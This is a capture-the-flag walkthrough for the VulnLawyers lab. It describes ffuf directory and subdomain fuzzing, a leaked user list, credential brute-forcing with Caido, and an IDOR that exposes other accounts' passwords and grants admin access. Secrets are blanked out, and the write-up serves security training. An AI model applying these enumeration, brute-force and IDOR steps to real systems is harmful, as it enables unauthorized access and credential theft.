VulnLawyers - CTF Walkthrough

📁 Repository Overview

  This repository contains a full walkthrough of the VulnLawyers CTF, solved using only:
  https://github.com/0xDarkwaveSiren/Vulnlawyers_0xWalkthrough/blob/main/Screenshots/access-as-manager.png

    ffuf (directory and subdomain fuzzing)

    Caido (web proxy analysis)

  The methodology follows a clean, repeatable pentest format with all flags captured and documented.

  All screenshots and proof-of-work are stored in the _/screenshots_ directory.

🔧 Tools Used

  ffuf – Fast web fuzzer

  Caido – Web proxy for intercepting and manipulating requests

  Linux shell (Parrot OS)

🔍 Scope

    https://sufrin.ctfi/

🧠 Objective

  Gain access to the VulnLawyers web server, enumerate for vulnerabilities, escalate privileges, and capture all flags.

🛰️ 1. Recon

⚠️ Note: No ports were open for full nmap scan; proceeded directly to web-based fuzzing using known open access.

📂 2. Directory Fuzzing with ffuf (Main Domain)

  _ffuf -w subdomains.txt -u https://sufrin.ctfi/FUZZ_

  Key results:

    /css
    /images
    /login

🌐 3. Subdomain Discovery with ffuf (Main Domain)

  _ffuf -w subdomains.txt -u https://sufrin.ctfi/ -H "Host: FUZZ.sufrin.ctfi"_

  Key result:

    data

📂 4. Directory Fuzzing with ffuf (Subdomain: data)

  _ffuf -w subdomains.txt -u https://data.sufrin.ctfi/FUZZ_

  Key result:

    /users

🔐 5. Intercept & Analyze with Caido

  Interecepted GET _/users_

  Key finding:

    {
    "users": [{
        "name": "Yusef Mcclain",
        "email": "________________"
    }, {
        "name": "Shayne Cairns",
        "email": "_________________________"
    }, {
        "name": "Eisa Evans",
        "email": "________________________"
    }, {
        "name": "Jaskaran Lowe",
        "email": "_______________________"
    }, {
        "name": "Marsha Blankenship",
        "email": "_________________________"
    }],
    "flag": "[________________________________]"
    }

  Intercepted GET _/login_

  Key finding:

    /lawyers-only

  Intercepted POST _/lawyers-only_ (login attempt)

  Key findings (Structure):

    email=admin&password=admin

🛠️ 6. Login Access with Caido

  Automated Matrix Payloads with Caido

  Used usernames found in _/users_ domain and _passwords.txt_ file provided by HackingHub

  Gained credentials and access to _/lawyers-only-profile_

🔐 7. Intercept & Analyze with Caido

Intercepted GET _/lawyers-only-profile-details/4_ (attempted change of credentials)

  Key findings: 

  Insecure Direct Object Reference (IDOR)

    {
    "id": 4,
    "name": "___________",
    "email": "_____________________",
    "password": "_____________"
    }

🧍 8. Privilege Escalation 

  Replayed request with Caido

  GET _/lawyers-only-profile-details/2_

  Key findings:

  User that happens to be the case manager

    {
    "id": 2,
    "name": "Shayne Cairns",
    "email": "_______________",
    "password": "______________",
    "flag": "[____________________]"
    }

  Gained access as Shayne Cairns (Case Manger - Admin)

🏁 7. Flags Captured

Flag # 1

  Path: _https://sufrin.ctfi/users_

Flag # 2

  Caido Intercept: GET _/login_

Flag # 3

  Caido Intercept: GET _/users_

Flag # 4

  Staff Portal: _https://sufrin.ctfi/lawyers-only_

Flag # 5

  Caido Request Replay: GET _/lawyers-only-profile-details/2_
  
Flag # 6

  Staff Portal as Shayne Cairns and deleted current case.

📌 Lessons Learned

Efficient use of just 2 tools (ffuf, caido) is enough to fully compromise a box

Importance of analyzing requests carefully in Caido

Logic flaws and poorly implemented login mechanisms are often more exploitable than buffer overflows
